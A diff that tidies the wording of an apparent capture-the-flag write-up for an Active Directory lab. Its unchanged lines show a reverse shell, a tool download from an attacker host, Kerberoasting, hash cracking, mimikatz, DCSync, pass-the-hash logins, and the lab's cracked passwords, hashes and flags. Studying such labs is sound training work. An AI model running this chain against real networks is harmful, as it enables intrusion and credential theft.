@@ -60,11 +60,11 @@ Nmap done: 1 IP address (1 host up) scanned in 92.35 seconds
 
 ### Initial Access
 
-Go to `/uploads` and find `antak.aspx` as the description says and use the credentials.
+Navigate to `/uploads` and locate `antak.aspx` as described, then use the credentials.
 
 ![](assets/Pasted%20image%2020250502123059.png)
 
-Put a powershell reverse shell to a listener to have a better shell.
+Deploy a PowerShell reverse shell to a listener for a better shell.
 
 ```shell
 $ rlwrap nc -lnvp 5555
@@ -86,9 +86,9 @@ JusT_g3tt1ng_st@rt3d!
 PS C:\users\administrator\desktop>
 ```
 
-Upload SharpHound.exe and collect AD info, then using a share, download it.
+Upload `SharpHound.exe` to collect AD information, then download it using a share.
 
-```shell
+```powershell
 PS C:\users\administrator> iwr -uri http://10.10.14.216:4444/SharpHound.exe -outfile sh.exe
 PS C:\users\administrator> .\sh.exe -c All
 ```
@@ -104,7 +104,7 @@ The command completed successfully.
 PS C:\users\administrator> cp 20250502045305_BloodHound.zip z:
 ```
 
-Upload Rubeus.exe and perform a kerberoasting attack.
+Perform a Kerberoasting attack using `Rubeus.exe`.
 
 ```powershell
 PS C:\> .\rubeus.exe kerberoast /simple /outfile:hashes.txt
@@ -132,7 +132,7 @@ PS C:\> .\rubeus.exe kerberoast /simple /outfile:hashes.txt
 [*] Roasted hashes written to : C:\hashes.txt
 ```
 
-Use hashcat to crack the hashes.
+Crack the hashes using `hashcat`.
 
 ```shell
 $ hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt --force                            
@@ -172,7 +172,7 @@ Ethernet adapter Ethernet0:
                                        10.129.0.1
 ```
 
-Upload ligolo and establish a tunnel.
+Upload `ligolo` and establish a tunnel.
 
 ```shell
 $ ./ligolo-proxy -selfcert -laddr 0.0.0.0:443
@@ -208,7 +208,7 @@ $ sudo ip route add 172.16.6.0/24 dev ligolo
 INFO[0429] Starting tunnel to NT AUTHORITY\SYSTEM@WEB-WIN01 (005056944a6b) 
 ```
 
-Perform a ping sweep to discover more hosts.
+Perform a ping sweep to discover additional hosts.
 
 ```shell
 $ fping -a -g 172.16.6.1 172.16.6.254 2>/dev/null        
@@ -217,7 +217,7 @@ $ fping -a -g 172.16.6.1 172.16.6.254 2>/dev/null
 172.16.6.100
 ```
 
-Check credentials against the two new hosts
+Check credentials against the two new hosts.
 
 ```shell
 $ nxc smb 172.16.6.50 -u svc_sql -p lucky7
@@ -255,7 +255,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds
 
 ### Initial Access
 
-Using credentials found via kerberoasting
+Use credentials found via Kerberoasting.
 
 ```shell
 $ evil-winrm -i 172.16.6.50 -u svc_sql -p lucky7                                    
@@ -281,8 +281,7 @@ Get the flag
 spn$_r0ast1ng_on_@n_0p3n_f1re
 ```
 
-
-Upload mimikatz.exe and extract hashes
+Upload `mimikatz.exe` and extract hashes.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\Administrator\desktop> upload mimikatz.exe 
@@ -321,11 +320,11 @@ SID               : S-1-5-21-2270287766-1317258649-2146029398-4607
          * Domain   : INLANEFREIGHT
 ```
 
-User tpetty can DCSync the domain
+User `tpetty` can perform a DCSync attack on the domain.
 
 ![](assets/Pasted%20image%2020250502164144.png)
 
-Using secretsdump
+Use `secretsdump` to extract credentials.
 
 ```shell
 $ impacket-secretsdump inlanefreight.local/tpetty@172.16.6.3 -hashes :fd37b6fec5704cadabb319cebf9e3a3a -dc-ip 172.16.6.3 -just-dc-user administrator
@@ -365,7 +364,7 @@ Nmap done: 1 IP address (1 host up) scanned in 37.51 seconds
 
 ### Initial Access
 
-Using evil-winrm with administrator's credentials from DCSync attack.
+Use `evil-winrm` with the administrator's credentials obtained from the DCSync attack.
 
 ```shell
 $ evil-winrm -i 172.16.6.3 -u administrator -H 27dedb1dab4d8545c6e1c66fba077da0
@@ -381,7 +380,7 @@ inlanefreight\administrator
 
 Get the flag
 
-```shell
+```powershell
 *Evil-WinRM* PS C:\Users\Administrator\desktop> type flag.txt
 r3plicat1on_m@st3r!
 ```
